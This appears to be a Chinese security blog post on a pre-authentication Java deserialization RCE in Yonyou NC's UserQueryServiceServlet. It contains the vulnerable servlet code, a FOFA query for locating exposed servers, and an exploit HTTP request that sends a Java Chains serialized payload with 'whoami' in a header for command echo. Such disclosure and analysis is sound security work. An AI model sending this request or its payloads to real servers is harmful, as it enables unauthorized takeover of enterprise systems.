---
title: "用友NC UserQueryServiceServlet反序列化漏洞"
source: https://mrxn.net/jswz/yonyou-nc-UserQueryServiceServlet-RCE.html
asset_dir: assets/用友nc-userqueryserviceservlet反序列化漏洞
---

# 用友NC UserQueryServiceServlet反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/25 08:30
- 1007浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

安全

鉴权

软件开发

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是一款由用友公司开发的企业级管理[软件](#)，旨在为大型企业集团提供全面的管理解决方案，涵盖财务、供应链、人力资源、生产制造等多个核心业务领域，并采用J2EE架构以支持复杂的企业应用。

漏洞修复方案

用友NC系统中的`UserQueryServiceServlet`接口（或其他类似处理序列化数据的组件）存在[反序列化](https://mrxn.net/tag/rce)漏洞。未经授权的远程攻击者可以构造恶意的序列化数据，并将其发送到受影响的用友NC服务器。

成功利用此漏洞后，攻击者可以在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器系统。这可能导致敏感数据泄露、系统被篡改，甚至对整个企业的信息系统造成严重破坏。

# 影响版本

NC63、NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

直接看 **UserQueryServiceServlet** 的实现

```
public class UserQueryServiceServlet extends HttpServlet {
    private static final long serialVersionUID = -5847889958965745395L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        new HashMap();
        ObjectOutputStream oos = new ObjectOutputStream(response.getOutputStream());
        HashMap<Object, Object> result = new HashMap();

        try {
            HashMap<Object, Object> params = (HashMap)in.readObject();
```

深入探索

安全运维咨询

企业安全咨询

服务器安全服务

**由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`\*\*），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

软件

# 漏洞复现

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行命令执行回显

[![用友NC UserQueryServiceServlet反序列化漏洞](images/img-001-51a5cdaaae32.webp)](https://image.mrxn.net/104d46cf52ff4bfbaee7dd74b8222eac.webp)

```
POST /servlet/UserQueryServiceServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/path/to/yourpayload.ser)}}
```

[![用友NC UserQueryServiceServlet反序列化漏洞](images/img-002-dea391123f75.webp)](https://image.mrxn.net/73f938ab96594981bf538e9fbcb2b522.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
